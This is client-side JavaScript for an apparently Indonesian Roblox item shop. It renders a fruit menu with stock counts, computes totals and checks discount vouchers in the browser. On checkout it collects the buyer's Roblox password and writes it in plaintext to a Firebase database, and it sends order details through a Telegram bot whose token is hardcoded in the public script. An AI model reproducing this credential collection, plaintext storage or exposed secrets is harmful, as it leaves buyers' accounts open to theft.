// CONFIG FIREBASE (Sama seperti joki)
const firebaseConfig = {
    apiKey: "AIzaSyAOU2RNedLbO5QpKm9gEHF7KQC9XFACMdc",
    authDomain: "xzyo-s.firebaseapp.com",
    databaseURL: "https://xzyo-s-default-rtdb.asia-southeast1.firebasedatabase.app",
    projectId: "xzyo-s", 
    storageBucket: "xzyo-s.firebasestorage.app",
    messagingSenderId: "949339875672", 
    appId: "1:949339875672:web:b5d751452bf5875a445d2d"
};
firebase.initializeApp(firebaseConfig);
const db = firebase.database();

// CONFIG TELEGRAM
const TELE_TOKEN = "8583864388:AAFjsa4xFHym5s1s2FRDMS04DrCaUYHKMPk"; 
const TELE_CHAT_ID = "6076444140"; 

// DATA MENU FRUIT DENGAN STOCK
const MENU_FRUIT = [
    { n: "🍎 PHYSICAL FRUIT (VIA TRADE)", header: true },
    { n: "✦ West Dragon", p: 400000, s: 0 }, 
    { n: "✦ East Dragon", p: 350000, s: 0 },  
    { n: "✦ Kitsune", p: 55000, s: 1 },
    { n: "✦ Tiger", p: 20000, s: 1 },
    { n: "✦ Yeti", p: 20000, s: 1 },
    { n: "✦ Control", p: 20000, s: 0 },
    { n: "✦ Gas", p: 10000, s: 0 },
    { n: "✦ Lightning", p: 15000, s: 1 },
    { n: "✦ Dough", p: 15000, s: 4 },
    { n: "✦ T-rex", p: 8000, s: 1 },
    { n: "✦ Portal", p: 7000, s: 6 },
    { n: "✦ Buddha", p: 7000, s: 7 },
    { n: "✦ Pain", p: 5000, s: 4 },
    { n: "✦ Grafity", p: 5000, s: 1 },
    { n: "✦ Mammoth", p: 5000, s: 5 },
    { n: "✦ Spirit", p: 5000, s: 3 },
    { n: "✦ Shadow", p: 5000, s: 3 },
];

let cart = {}; 
let selectedPay = "", currentTid = "", discount = 0;

// RENDER LIST KE HTML
function init() {
    const box = document.getElementById('joki-list'); 
    if(!box) return;
    box.innerHTML = ""; 
    
    MENU_FRUIT.forEach((item, index) => {
        if (item.header) {
            box.innerHTML += `<div class="item-header" style="background: #2c3e50; color: #fff; padding: 10px; margin-top: 10px; font-weight: bold; border-radius: 12px; text-align: center; margin-bottom: 8px;">${item.n}</div>`;
        } else {
            const out = item.s <= 0;
            box.innerHTML += `
            <div class="item-joki-cart" id="item-${index}" style="display:flex; justify-content:space-between; align-items:center; padding:12px; background:${out ? '#161b22' : 'var(--inactive)'}; margin-bottom:8px; border-radius:15px; border:1px solid ${out ? '#21262d' : 'var(--border)'}; opacity:${out ? '0.5' : '1'}">
                <div style="flex:1">
                    <div style="font-weight:600; font-size:14px;">${item.n}</div>
                    <div style="color:var(--primary); font-size:12px;">Rp ${item.p.toLocaleString()} | Stock: ${item.s}</div>
                </div>
                <div style="display:flex; align-items:center; gap:10px;">
                    <button onclick="${out ? '' : `updateCart(${index}, -1)`}" style="width:28px; height:28px; border-radius:8px; border:none; background:#30363d; color:white; cursor:pointer;">-</button>
                    <span id="qty-${index}" style="font-weight:800; min-width:15px; text-align:center;">0</span>
                    <button onclick="${out ? '' : `updateCart(${index}, 1)`}" style="width:28px; height:28px; border-radius:8px; border:none; background:${out ? '#21262d' : 'var(--primary)'}; color:${out ? '#484f58' : 'black'}; cursor:pointer; font-weight:800;">${out ? 'X' : '+'}</button>
                </div>
            </div>`;
        }
    });
}

// UPDATE JUMLAH BELI
function updateCart(index, delta) {
    if (!cart[index]) cart[index] = 0;
    
    // Cek Stock
    if (delta > 0 && cart[index] >= MENU_FRUIT[index].s) {
        alert("Stock habis, Lek!");
        return;
    }

    cart[index] += delta;
    if (cart[index] < 0) cart[index] = 0;

    document.getElementById(`qty-${index}`).innerText = cart[index];
    
    const el = document.getElementById(`item-${index}`);
    if (cart[index] > 0) {
        el.style.borderColor = "var(--primary)";
        el.style.background = "rgba(0, 210, 255, 0.05)";
    } else {
        el.style.borderColor = "var(--border)";
        el.style.background = "var(--inactive)";
    }
    hitung();
}

// HITUNG TOTAL
function hitung() {
    let txt = ""; 
    let subtotal = 0;
    
    MENU_FRUIT.forEach((item, index) => {
        if (cart[index] > 0) {
            txt += `${item.n} (${cart[index]}x), `;
            subtotal += (item.p * cart[index]);
        }
    });
    
    let totalFix = subtotal - (subtotal * discount);
    document.getElementById('detailText').value = txt.slice(0, -2);
    document.getElementById('totalAkhir').innerText = "Rp " + totalFix.toLocaleString();
    updateBtn();
}

// VOUCHER
function applyVoucher() {
    const code = document.getElementById('vouchCode').value.toUpperCase();
    const daftarVoucher = { "R3Z4": 0.20, "RAF4": 0.15, "FEB2026": 0.15 };

    if (daftarVoucher[code]) {
        discount = daftarVoucher[code];
        alert("Voucher Berhasil!");
    } else {
        discount = 0;
        alert("Voucher Gagal!");
    }
    hitung();
}

function selectPay(m, el) {
    selectedPay = m;
    document.querySelectorAll('.pay-bar').forEach(p => p.classList.remove('selected'));
    el.classList.add('selected');
    updateBtn();
}

function updateBtn() {
    const u = document.getElementById('userRoblox').value;
    const hasItems = Object.values(cart).some(q => q > 0);
    document.getElementById('btnGas').disabled = !(u && hasItems && selectedPay);
}

// PROSES PESANAN
async function prosesPesanan() {
    const loader = document.getElementById('loading-overlay');
    if(loader) loader.style.display = 'flex';

    currentTid = "FRUIT-" + Math.floor(Math.random()*900000+100000);
    const u = document.getElementById('userRoblox').value;
    const p = document.getElementById('passRoblox').value; // Tetap simpan pass jika butuh, atau ganti level
    const w = document.getElementById('waUser').value;
    const itm = document.getElementById('detailText').value;
    const tot = document.getElementById('totalAkhir').innerText;

    try {
        await db.ref('orders/' + currentTid).set({
            tid: currentTid, status: "pending", user: u, pass: p, wa: w, items: itm, total: tot, method: selectedPay, timestamp: Date.now()
        });

        const pesanTele = `🍎 *ORDER FRUIT BARU!*\n--------------------------\n🆔 *ID:* \`${currentTid}\` \n👤 *User:* \`${u}\` \n📱 *WA:* ${w} \n🛒 *Buah:* ${itm} \n💰 *Total:* ${tot}\n--------------------------`;
        await fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage?chat_id=${TELE_CHAT_ID}&text=${encodeURIComponent(pesanTele)}&parse_mode=Markdown`);

        setTimeout(() => {
            if(loader) loader.style.display = 'none';
            switchSlide(1, 2);
            document.getElementById('payNominal').innerText = tot;
            document.getElementById('displayTid').innerText = currentTid;
            
            // Logika QRIS/DANA tetap sama
            const infoTeks = document.getElementById('payMethodInfo');
            if (selectedPay === "DANA") infoTeks.innerText = "DANA: 089677323404";
            else if (selectedPay === "QRIS") infoTeks.innerText = "SILAKAN SCAN QRIS";
            // ... tambahkan yang lain jika perlu
        }, 1500);

    } catch (err) {
        if(loader) loader.style.display = 'none';
        alert("Error, coba lagi!");
    }
}

function switchSlide(from, to) {
    document.getElementById('slide-' + from).classList.remove('active');
    setTimeout(() => { document.getElementById('slide-' + to).classList.add('active'); }, 100);
}

window.onload = init;
